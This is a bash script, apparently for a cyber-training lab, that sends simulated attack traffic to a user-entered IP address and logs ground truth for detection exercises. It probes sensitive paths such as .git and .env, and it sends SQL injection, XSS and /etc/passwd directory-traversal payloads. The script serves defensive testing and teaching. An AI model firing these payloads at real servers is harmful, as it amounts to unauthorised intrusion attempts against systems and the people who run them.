#!/bin/bash

# ============================================================
# Nordic Manufacturing A/S - Attack Simulation
# Phase 02 - Web Application Attack
#
# Purpose:
#   Generate controlled malicious-looking HTTP requests against
#   a lab web server.
#
# Evidence:
#   - Web reconnaissance
#   - Sensitive path enumeration
#   - SQL injection attempts
#   - XSS attempts
#   - Directory traversal attempts
#   - Suspicious User-Agent
#
# IMPORTANT:
#   Intended for the Nordic Manufacturing CyberLab only.
# ============================================================

set -u

BASE_DIR="/opt/nordic-attack"
LOG_DIR="$BASE_DIR/logs"

mkdir -p "$LOG_DIR"

TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
LOGFILE="$LOG_DIR/web-$TIMESTAMP.log"
GROUNDTRUTH="$LOG_DIR/incident-ground-truth.log"


# ------------------------------------------------------------
# Functions
# ------------------------------------------------------------

log_event() {
    echo "$(date --iso-8601=seconds) | WEB | $1" >> "$GROUNDTRUTH"
}

banner() {
    clear
    echo "============================================================"
    echo "       NORDIC MANUFACTURING - WEB ATTACK"
    echo "============================================================"
    echo
}

request() {

    DESCRIPTION="$1"
    URL="$2"

    echo
    echo "[*] $DESCRIPTION"
    echo "    $URL"

    log_event "$DESCRIPTION against $URL"

    {
        echo
        echo "------------------------------------------------------------"
        echo "$DESCRIPTION"
        echo "URL: $URL"
        echo "Time: $(date --iso-8601=seconds)"
        echo "------------------------------------------------------------"

        curl \
            --path-as-is \
            --connect-timeout 3 \
            --max-time 8 \
            -s \
            -o /dev/null \
            -w "HTTP %{http_code} | %{size_download} bytes | %{time_total}s\n" \
            -A "Mozilla/5.0 NordicSecurityAudit/1.0" \
            "$URL" || true

    } >> "$LOGFILE" 2>&1

    sleep 2
}


# ------------------------------------------------------------
# Start
# ------------------------------------------------------------

banner

echo "This simulation generates suspicious HTTP requests"
echo "against a CyberLab web server."
echo

read -rp "Target IP: " TARGET

if [[ -z "$TARGET" ]]; then
    echo
    echo "[ERROR] No target specified."
    exit 1
fi


# ------------------------------------------------------------
# Validate IPv4
# ------------------------------------------------------------

if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo
    echo "[ERROR] Invalid IPv4 address."
    exit 1
fi

IFS='.' read -r o1 o2 o3 o4 <<< "$TARGET"

for octet in "$o1" "$o2" "$o3" "$o4"; do

    if (( octet < 0 || octet > 255 )); then
        echo
        echo "[ERROR] Invalid IPv4 address."
        exit 1
    fi

done


# ------------------------------------------------------------
# Port
# ------------------------------------------------------------

echo
read -rp "Web port [80]: " PORT

PORT=${PORT:-80}

if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    echo
    echo "[ERROR] Invalid TCP port."
    exit 1
fi


BASE_URL="http://$TARGET:$PORT"


echo
echo "Target:"
echo
echo "    $BASE_URL"
echo

log_event "Web attack simulation started against $BASE_URL"


{
    echo "============================================================"
    echo "Nordic Manufacturing - Web Attack"
    echo "============================================================"
    echo
    echo "Time:   $(date --iso-8601=seconds)"
    echo "Source: $(hostname)"
    echo "Target: $BASE_URL"
    echo
} >> "$LOGFILE"


# ------------------------------------------------------------
# Phase 1 - Normal request
# ------------------------------------------------------------

echo "[1/5] Initial web reconnaissance"

request \
    "Initial HTTP request" \
    "$BASE_URL/"


# ------------------------------------------------------------
# Phase 2 - Sensitive path discovery
# ------------------------------------------------------------

echo
echo "[2/5] Searching for interesting web paths"

PATHS=(
    "admin"
    "login"
    "administrator"
    "backup"
    "config"
    ".git"
    ".env"
    "robots.txt"
)

for PATHNAME in "${PATHS[@]}"; do

    request \
        "Sensitive path discovery: /$PATHNAME" \
        "$BASE_URL/$PATHNAME"

done


# ------------------------------------------------------------
# Phase 3 - SQL Injection simulation
# ------------------------------------------------------------

echo
echo "[3/5] Generating SQL injection attempts"

request \
    "SQL injection attempt - authentication bypass" \
    "$BASE_URL/login.php?username=admin%27%20OR%20%271%27%3D%271&password=test"

request \
    "SQL injection attempt - UNION SELECT" \
    "$BASE_URL/index.php?id=1%20UNION%20SELECT%201,2,3"


# ------------------------------------------------------------
# Phase 4 - XSS simulation
# ------------------------------------------------------------

echo
echo "[4/5] Generating XSS attempts"

request \
    "Cross-site scripting attempt" \
    "$BASE_URL/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

request \
    "Cross-site scripting attempt - IMG event" \
    "$BASE_URL/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"


# ------------------------------------------------------------
# Phase 5 - Directory traversal simulation
# ------------------------------------------------------------

echo
echo "[5/5] Generating directory traversal attempts"

request \
    "Directory traversal attempt - passwd" \
    "$BASE_URL/../../../../etc/passwd"

request \
    "Encoded directory traversal attempt" \
    "$BASE_URL/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


# ------------------------------------------------------------
# Finish
# ------------------------------------------------------------

log_event "Web attack simulation completed against $BASE_URL"


echo
echo "============================================================"
echo " Web attack simulation completed"
echo "============================================================"
echo
echo "Target:"
echo "  $BASE_URL"
echo
echo "Attack log:"
echo "  $LOGFILE"
echo
echo "Ground truth:"
echo "  $GROUNDTRUTH"
echo